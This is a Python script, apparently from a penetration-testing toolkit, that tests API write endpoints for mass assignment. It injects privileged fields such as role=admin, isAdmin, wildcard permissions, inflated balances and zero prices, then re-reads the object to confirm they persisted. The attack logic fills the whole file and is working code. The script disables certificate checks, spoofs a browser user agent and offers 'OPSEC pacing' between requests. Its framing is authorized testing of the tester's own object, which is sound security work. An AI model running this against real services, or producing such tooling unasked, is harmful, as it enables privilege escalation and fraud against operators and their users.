#!/usr/bin/env python3
"""
massassign_fuzz.py — authorized mass-assignment (BOPLA/API3) tester.

It takes a legitimate write request (your own object) and injects hidden privileged fields the UI never sends —
role/isAdmin/isVerified/price/balance/credits/... in camelCase, snake_case, and nested forms — then (optionally)
re-GETs the object to prove the field actually PERSISTED (echo in the write response is NOT proof; §7.2/§17).

Discipline: target YOUR OWN object. A stuck privileged field is a LEAD -> confirm it has EFFECT (you can now reach an
admin function / your balance changed / price is 0). Non-destructive; clean up.

Usage:
  python3 massassign_fuzz.py -u https://api.target.com/api/v1/users/me -X PATCH --token "Bearer <A>" \
      --get https://api.target.com/api/v1/users/me
  # add your own known good fields so the request stays valid:
  python3 massassign_fuzz.py -u .../users/me -X PATCH --token "Bearer <A>" --base-body '{"name":"x8"}' --get .../users/me
"""
import argparse, json, sys, time
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"

# hidden fields worth trying — extend with names you find in the GET response / spec / JS models
INJECT = {
    "role": "admin", "isAdmin": True, "is_admin": True, "is_staff": True, "admin": True,
    "isVerified": True, "is_verified": True, "emailVerified": True, "verified": True,
    "status": "approved", "approved": True, "active": True, "enabled": True,
    "accountBalance": 999999, "balance": 999999, "credits": 100000, "points": 100000,
    "price": 0, "amount": 0, "discount": 100, "planId": "enterprise", "plan": "enterprise",
    "permissions": ["*"], "roles": ["admin"], "scope": "admin",
}
NESTED = {"user": {"isAdmin": True}, "role": {"name": "admin"}, "account": {"balance": 999999}}


def send(method, url, token, body_obj, timeout):
    h = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}
    if token:
        h["Authorization"] = token
    try:
        r = requests.request(method, url, headers=h, data=json.dumps(body_obj), timeout=timeout,
                             verify=False, allow_redirects=False)
        return r
    except Exception as e:
        print(f"   [!] request error: {e}")
        return None


def get_obj(url, token, timeout):
    h = {"User-Agent": UA, "Accept": "application/json"}
    if token:
        h["Authorization"] = token
    try:
        return requests.get(url, headers=h, timeout=timeout, verify=False).json()
    except Exception:
        return None


def flatten(d, pre=""):
    out = {}
    if isinstance(d, dict):
        for k, v in d.items():
            out.update(flatten(v, f"{pre}{k}."))
    elif isinstance(d, list):                 # recurse into arrays (list/collection responses) so persistence is still detected
        for i, v in enumerate(d):
            out.update(flatten(v, f"{pre}{i}."))
    else:
        out[pre.rstrip(".")] = d
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="write endpoint (your own object)")
    ap.add_argument("-X", "--method", default="PATCH", choices=["POST", "PUT", "PATCH"])
    ap.add_argument("--token", help='e.g. "Bearer <A>"')
    ap.add_argument("--base-body", default="{}", help="valid JSON your endpoint needs (keeps the request accepted)")
    ap.add_argument("--get", help="GET url to re-read the object and prove the field PERSISTED")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between requests (OPSEC pacing)")
    ap.add_argument("--timeout", type=float, default=20)
    a = ap.parse_args()

    try:
        base = json.loads(a.base_body)
    except json.JSONDecodeError:
        sys.exit("--base-body must be valid JSON")

    # running baseline: diff each accepted write against the state JUST BEFORE it (not a stale initial snapshot),
    # so persistence is attributed to the right combo even though writes accumulate.
    prev = get_obj(a.get, a.token, a.timeout) if a.get else None
    prevflat = flatten(prev) if isinstance(prev, (dict, list)) else {}

    # one combined shot first, then per-field to see which specific field is accepted
    combos = [("ALL", {**base, **INJECT, **NESTED})] + [(k, {**base, k: v}) for k, v in INJECT.items()]
    # (key, value) pairs to look for; ALL checks every injected leaf incl. NESTED (user.isAdmin, role.name, ...)
    all_pairs = list(INJECT.items()) + [(fk.split(".")[-1], fv) for fk, fv in flatten(NESTED).items()]
    print(f"[*] mass-assignment on {a.method} {a.url} ({len(combos)} payloads). PERSISTENCE = a separate re-read via "
          "--get after each ACCEPTED write (echo in the write response is NOT proof).\n")

    for name, body in combos:
        r = send(a.method, a.url, a.token, body, a.timeout)
        if r is None:
            continue
        tag = ""
        if a.get and r.status_code in range(200, 300):     # re-read only on accepted writes (echo-proof + fewer requests)
            after = get_obj(a.get, a.token, a.timeout)
            aflat = flatten(after) if isinstance(after, (dict, list)) else {}
            pairs = all_pairs if name == "ALL" else [(name, body.get(name))]
            stuck = []
            for k, v in pairs:
                for fk, fv in aflat.items():
                    if fk.split(".")[-1].lower() == k.lower() and str(fv).lower() == str(v).lower() and prevflat.get(fk) != fv:
                        stuck.append(f"{fk}={fv}")
            if stuck:
                tag = "  [PERSISTED] <=== " + ", ".join(sorted(set(stuck))[:6])
            prevflat = aflat                                # advance baseline so the NEXT combo is attributed correctly
        print(f"   {name:16} -> {r.status_code}{tag}")
        if a.delay:
            time.sleep(a.delay)

    print("\n[!] A PERSISTED privileged field is a LEAD — now prove it has EFFECT (reach an admin fn / price 0 / balance). "
          "Own object only; clean up (§20).")


if __name__ == "__main__":
    main()
